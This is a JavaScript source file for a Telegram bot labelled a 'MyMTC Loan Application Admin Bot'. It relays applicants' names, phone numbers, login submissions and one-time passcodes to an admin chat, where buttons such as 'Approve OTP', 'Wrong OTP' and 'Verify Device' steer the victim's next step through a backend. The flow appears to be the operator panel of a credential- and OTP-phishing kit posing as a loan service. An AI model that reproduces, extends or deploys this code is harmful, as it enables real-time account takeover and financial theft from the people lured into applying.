const { Telegraf } = require('telegraf');
require('dotenv').config();
const axios = require('axios');

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID;
const API_BASE_URL = process.env.API_BASE_URL || 'http://localhost:3000/api';

// Store pending approvals with inline keyboard
const pendingRequests = new Map();

// Send notification to admin about new loan application
function notifyNewApplication(session) {
  const message = `
🆕 <b>NEW LOAN APPLICATION</b>

👤 <b>Name:</b> ${session.fullName}
📱 <b>Phone:</b> ${session.phoneNumber}
💰 <b>Loan Amount:</b> N$${session.loanAmount.toLocaleString()}
📋 <b>Purpose:</b> ${session.loanPurpose}
🆔 <b>Session ID:</b> <code>${session.sessionId}</code>

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `;

  bot.telegram.sendMessage(ADMIN_ID, message, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✓ Approve', callback_data: `app_approve_${session.sessionId}` },
          { text: '✗ Deny', callback_data: `app_deny_${session.sessionId}` },
        ],
      ],
    },
  });
}

// Send notification about login submission
function notifyLoginSubmission(session) {
  const message = `
🔐 <b>LOGIN VERIFICATION SUBMITTED</b>

👤 <b>Name:</b> ${session.fullName}
📱 <b>Phone:</b> ${session.loginPhone}
🆔 <b>Session ID:</b> <code>${session.sessionId}</code>

📧 <b>Status:</b> Awaiting verification

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `;

  bot.telegram.sendMessage(ADMIN_ID, message, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✓ Approve', callback_data: `login_approve_${session.sessionId}` },
          { text: '✗ Deny', callback_data: `login_deny_${session.sessionId}` },
        ],
        [
          { text: '🔄 Verify Device', callback_data: `verify_device_${session.sessionId}` },
        ],
      ],
    },
  });

  pendingRequests.set(`login_${session.sessionId}`, session);
}

// Send notification about OTP submission
function notifyOTPSubmission(session) {
  const message = `
✅ <b>OTP VERIFICATION SUBMITTED</b>

👤 <b>Name:</b> ${session.fullName}
📱 <b>Phone:</b> ${session.phoneNumber}
🆔 <b>Session ID:</b> <code>${session.sessionId}</code>

📧 <b>Status:</b> Awaiting OTP verification

⏰ <b>Time:</b> ${new Date().toLocaleString()}
  `;

  bot.telegram.sendMessage(ADMIN_ID, message, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✓ Approve OTP', callback_data: `otp_approve_${session.sessionId}` },
          { text: '✗ Wrong OTP', callback_data: `otp_wrong_${session.sessionId}` },
        ],
      ],
    },
  });

  pendingRequests.set(`otp_${session.sessionId}`, session);
}

// Handle callback queries (button clicks)
bot.on('callback_query', async (ctx) => {
  const callbackData = ctx.callbackQuery.data;
  const [action, ...rest] = callbackData.split('_');
  const sessionId = rest.join('_');

  try {
    let apiAction = '';

    // Parse action
    if (callbackData.startsWith('app_approve')) {
      apiAction = 'approve_login';
      await ctx.answerCbQuery('✓ Application approved!');
    } else if (callbackData.startsWith('app_deny')) {
      apiAction = 'deny_login';
      await ctx.answerCbQuery('✗ Application denied!');
    } else if (callbackData.startsWith('login_approve')) {
      apiAction = 'approve_login';
      await ctx.answerCbQuery('✓ Login approved!');
    } else if (callbackData.startsWith('login_deny')) {
      apiAction = 'deny_login';
      await ctx.answerCbQuery('✗ Login denied!');
    } else if (callbackData.startsWith('verify_device')) {
      apiAction = 'verify_device';
      await ctx.answerCbQuery('🔄 Verify Device requested!');
    } else if (callbackData.startsWith('otp_approve')) {
      apiAction = 'approve_otp';
      await ctx.answerCbQuery('✓ OTP approved!');
    } else if (callbackData.startsWith('otp_wrong')) {
      apiAction = 'wrong_otp';
      await ctx.answerCbQuery('✗ Wrong OTP!');
    }

    // Send callback to backend
    const response = await axios.post(`${API_BASE_URL}/telegram-callback`, {
      sessionId,
      action: apiAction,
      reason: '',
    });

    // Update message to show approval
    const statusEmoji = apiAction.includes('approve') ? '✅' : 
                       apiAction.includes('deny') ? '❌' :
                       apiAction === 'verify_device' ? '🔄' :
                       apiAction === 'wrong_otp' ? '❌' : '⏳';

    await ctx.editMessageText(
      ctx.callbackQuery.message.text + `\n\n${statusEmoji} <b>Action Processed:</b> ${apiAction}`,
      { parse_mode: 'HTML' }
    );

    console.log(`✓ Processed callback: ${apiAction} for session ${sessionId}`);
  } catch (error) {
    console.error('Error processing callback:', error);
    await ctx.answerCbQuery('Error processing request', true);
  }
});

// Start command
bot.start((ctx) => {
  ctx.reply(`
Welcome to MyMTC Loan Application Admin Bot 🤖

This bot handles loan application approvals:
- 📱 Phone verification
- 🔐 Login verification
- ✅ OTP verification

When users submit applications, they will appear here for approval.
  `, {
    parse_mode: 'HTML',
  });
});

// Help command
bot.help((ctx) => {
  ctx.reply(`
Available commands:
/start - Welcome message
/help - This message
/status - Check pending approvals
/clear - Clear all pending requests
  `);
});

// Status command
bot.command('status', (ctx) => {
  const pendingCount = pendingRequests.size;
  ctx.reply(`
📊 Bot Status:
✓ Bot is running
⏳ Pending requests: ${pendingCount}
  `);
});

// Clear command
bot.command('clear', (ctx) => {
  pendingRequests.clear();
  ctx.reply('✓ Cleared all pending requests');
});

// Export functions
module.exports = {
  bot,
  notifyNewApplication,
  notifyLoginSubmission,
  notifyOTPSubmission,
  pendingRequests,
};

// Launch bot in polling mode
bot.launch({
  polling: {
    interval: 300,
    timeout: 20,
  },
}).then(() => {
  console.log('✓ Telegram bot started successfully');
  console.log(`Admin Chat ID: ${ADMIN_ID}`);
}).catch(error => {
  console.error('Error starting Telegram bot:', error);
  process.exit(1);
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
